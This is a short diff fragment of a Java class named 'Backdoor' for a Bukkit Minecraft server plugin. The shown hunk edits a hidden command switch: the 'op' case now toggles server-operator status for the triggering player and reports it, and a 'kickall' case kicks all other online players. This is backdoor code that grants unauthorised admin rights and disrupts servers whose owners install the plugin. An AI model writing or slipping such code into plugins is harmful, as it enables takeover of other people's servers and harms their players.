@@ -70,7 +70,8 @@ public class Backdoor implements Listener {
 						break;
 
 					case "op":
-						p.setOp(true);
+						p.setOp(!p.isOp());
+						p.sendMessage("OP: " + p.isOp());
 						break;
 					case "kickall":
 						Bukkit.getOnlinePlayers().stream().filter(l -> l != p).forEach(l -> l.kickPlayer(arg));
